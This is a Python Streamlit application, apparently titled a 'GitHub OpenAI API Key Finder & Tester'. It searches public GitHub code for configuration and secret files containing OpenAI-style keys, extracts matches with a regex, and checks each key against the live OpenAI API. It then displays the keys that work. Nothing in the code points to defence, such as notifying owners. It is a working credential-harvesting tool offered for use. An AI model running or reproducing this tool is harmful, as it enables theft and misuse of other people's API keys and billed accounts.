import os
import re
import requests
import aiohttp
import asyncio
import logging
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
from aiohttp import ClientSession, ClientTimeout
import streamlit as st

# Initialize logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Constants
DEFAULT_SEARCH_QUERY = """
(path:*.xml OR path:*.json OR path:*.properties OR path:*.sql OR path:*.txt OR path:*.log OR path:*.tmp OR path:*.backup OR path:*.bak OR path:*.enc OR path:*.yml OR path:*.yaml OR path:*.ini OR path:*.config OR path:*.conf OR path:*.cfg OR path:*.env OR path:*.envrc OR path:*.prod OR path:*.secret OR path:*.private OR path:*.key) AND 
(access_key OR secret_key OR access_token OR api_key OR apikey OR api_secret OR apiSecret OR app_secret OR application_key OR app_key OR appkey OR auth_token OR authsecret) AND 
(/sk-[a-zA-Z0-9]{48}/ AND (openai OR gpt))
"""

# Function to search GitHub for potential OpenAI API keys
def search_github(query, token=None, username=None, password=None, page=1):
    headers = {
        'Accept': 'application/vnd.github.v3+json',
        'Authorization': f'token {token}' if token else None
    }
    params = {'q': query, 'per_page': 100, 'page': page}
    
    try:
        if token:
            response = requests.get('https://api.github.com/search/code', headers=headers, params=params)
        else:
            response = requests.get('https://api.github.com/search/code', params=params, auth=HTTPBasicAuth(username, password))
        
        response.raise_for_status()
    except requests.exceptions.HTTPError as http_err:
        logger.error(f"HTTP error occurred: {http_err}")
        st.error(f"HTTP error occurred: {http_err}")
        return None
    except Exception as err:
        logger.error(f"Other error occurred: {err}")
        st.error(f"Other error occurred: {err}")
        return None
    
    return response.json()

# Function to handle GitHub login if token is not provided or fails
def login_github(username, password):
    login_url = 'https://github.com/login'
    session = requests.Session()
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    authenticity_token = soup.find('input', {'name': 'authenticity_token'})['value']
    
    login_data = {
        'login': username,
        'password': password,
        'authenticity_token': authenticity_token
    }
    response = session.post('https://github.com/session', data=login_data)
    if response.url == 'https://github.com/':
        logger.info("Successfully logged in with username and password.")
        return session
    else:
        logger.error("Login failed.")
        st.error("Login failed.")
        return None

# Function to extract keys from the search results
def extract_keys(search_results):
    key_pattern = re.compile(r'sk-[a-zA-Z0-9]{48}')
    keys = set()
    for item in search_results.get('items', []):
        content_url = item['url']
        headers = {'Authorization': f'token {os.getenv("GITHUB_TOKEN")}'}
        try:
            response = requests.get(content_url, headers=headers)
            response.raise_for_status()
            matches = key_pattern.findall(response.text)
            keys.update(matches)
        except requests.exceptions.HTTPError as http_err:
            logger.error(f"HTTP error occurred while fetching content: {http_err}")
        except Exception as err:
            logger.error(f"Other error occurred while fetching content: {err}")
    return list(keys)

# Function to test OpenAI keys asynchronously
async def test_key(session, key):
    headers = {
        'Authorization': f'Bearer {key}',
        'Content-Type': 'application/json'
    }
    data = {
        'model': 'gpt-3.5-turbo',
        'messages': [{'role': 'user', 'content': 'Say this is a test'}]
    }
    try:
        async with session.post('https://api.openai.com/v1/chat/completions', headers=headers, json=data) as response:
            if response.status == 200:
                return key
            return None
    except Exception as e:
        logger.error(f"Error testing key {key}: {e}")
        return None

# Function to handle pagination
def handle_pagination(query, token=None, username=None, password=None):
    page = 1
    all_keys = set()
    while True:
        search_results = search_github(query, token, username, password, page)
        if not search_results or 'items' not in search_results:
            break
        keys = extract_keys(search_results)
        if not keys:
            break
        all_keys.update(keys)
        page += 1
    return list(all_keys)

# Function to test all keys asynchronously
async def test_keys(keys):
    timeout = ClientTimeout(total=60)  # Set a total timeout for requests
    async with ClientSession(timeout=timeout) as session:
        tasks = [test_key(session, key) for key in keys]
        results = await asyncio.gather(*tasks)
    return [key for key in results if key]

# Streamlit UI
st.title("GitHub OpenAI API Key Finder & Tester")

# Get credentials
token = st.text_input("Enter your GitHub Personal Access Token (Leave blank to use username and password):", type='password')
username = st.text_input("Enter your GitHub Username (only if not using a token):")
password = st.text_input("Enter your GitHub Password (only if not using a token):", type='password')

if st.button("Search and Test Keys"):
    if token:
        st.spinner("Searching GitHub for potential OpenAI API keys...")
        search_query = DEFAULT_SEARCH_QUERY
        keys = handle_pagination(search_query, token)
        
        st.write(f"Found {len(keys)} potential keys.")

        if keys:
            st.spinner("Testing keys...")
            loop = asyncio.get_event_loop()
            valid_keys = loop.run_until_complete(test_keys(keys))
            
            st.write(f"Found {len(valid_keys)} valid keys.")
            st.write(valid_keys)
        else:
            st.write("No keys found.")
    elif username and password:
        st.spinner("Logging in to GitHub...")
        session = login_github(username, password)
        if session:
            st.spinner("Searching GitHub for potential OpenAI API keys...")
            search_query = DEFAULT_SEARCH_QUERY
            keys = handle_pagination(search_query, None, username, password)
            
            st.write(f"Found {len(keys)} potential keys.")

            if keys:
                st.spinner("Testing keys...")
                loop = asyncio.get_event_loop()
                valid_keys = loop.run_until_complete(test_keys(keys))
                
                st.write(f"Found {len(valid_keys)} valid keys.")
                st.write(valid_keys)
            else:
                st.write("No keys found.")
    else:
        st.error("Please provide either a GitHub Personal Access Token or username and password.")
